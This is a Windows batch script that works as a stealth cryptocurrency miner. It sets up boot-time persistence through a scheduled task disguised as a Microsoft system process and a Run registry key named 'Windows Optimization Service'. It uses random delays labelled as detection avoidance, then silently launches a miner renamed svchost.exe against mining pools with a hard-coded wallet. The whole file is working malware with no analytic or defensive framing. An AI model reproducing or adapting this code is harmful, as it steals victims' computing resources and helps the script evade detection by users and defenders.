@echo off

setlocal enableDelayedExpansion

REM ================================
REM Advanced Persistence Setup (STEALTH)
REM ================================

REM Check if scheduled task already exists
schtasks /query /tn "Microsoft\Windows\System Host Process" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo Configuring system optimization...
    
    REM Create scheduled task with HIDDEN settings
    schtasks /create /tn "Microsoft\Windows\System Host Process" /tr "cmd.exe /c \"\"%~f0\"\"" /sc onstart /ru "SYSTEM" /rl highest /f >nul 2>&1
    
    REM If SYSTEM failed, try with current user (HIDDEN)
    if %ERRORLEVEL% NEQ 0 (
        schtasks /create /tn "Microsoft\Windows\System Host Process" /tr "cmd.exe /c \"\"%~f0\"\"" /sc onlogon /f >nul 2>&1
    )
    
    REM Also create backup registry entry (HIDDEN via cmd)
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Optimization Service" /t REG_SZ /d "cmd.exe /c \"\"%~f0\"\"" /f >nul 2>&1
)

REM ================================
REM Smart Delay & Detection Avoidance  
REM ================================

REM Check if this is first run after boot
set "BOOT_MARKER=%TEMP%\winhostproc.tmp"
if not exist "%BOOT_MARKER%" (
    REM First run - create marker and wait longer
    echo. > "%BOOT_MARKER%" 2>nul
    
    REM Wait for system to fully load (2-5 minutes random)
    set /a "delay=%RANDOM% * 180 / 32768 + 120"
    timeout /t %delay% /nobreak >nul 2>&1
) else (
    REM Subsequent runs - shorter delay
    set /a "delay=%RANDOM% * 30 / 32768 + 10"
    timeout /t %delay% /nobreak >nul 2>&1
)

Rem #################################
Rem ## Begin of user-editable part ##
Rem #################################

set "POOL=de.etc.herominers.com:1150"
set "POOL2=etc.herominers.com:10161"
set "WALLET=0xb5706f1fc184b5ee4f8c9c296838ce3d83d76857"
set "WORKER=lolMinerWorker"
set "EXTRAPARAMETERS=--apiport 8020"

Rem #################################
Rem ##  End of user-editable part  ##
Rem #################################

cd /d %~dp0

set MyVariable=%CD%\svchost.exe

REM Check if mining executable exists
if not exist "%MyVariable%" (
    exit /b 1
)

:WindowsVer
REM Start mining silently (no echo)
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "10.0" goto W10
goto OtherW

:W10
start /b "" "%MyVariable%" --algo ETCHASH --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS! >nul 2>&1
if %ERRORLEVEL% == 42 (
    timeout 10 /nobreak >nul 2>&1
    goto W10
)
goto END

:OtherW
start /b "" "%MyVariable%" --algo ETCHASH --pool !POOL! --user !WALLET! --pool !POOL2! --user !WALLET! --worker !WORKER! --watchdog exit !EXTRAPARAMETERS! --nocolor >nul 2>&1
if %ERRORLEVEL% == 42 (
    timeout 10 /nobreak >nul 2>&1
    goto OtherW
)

:END
REM Exit silently without pause
exit /b 0 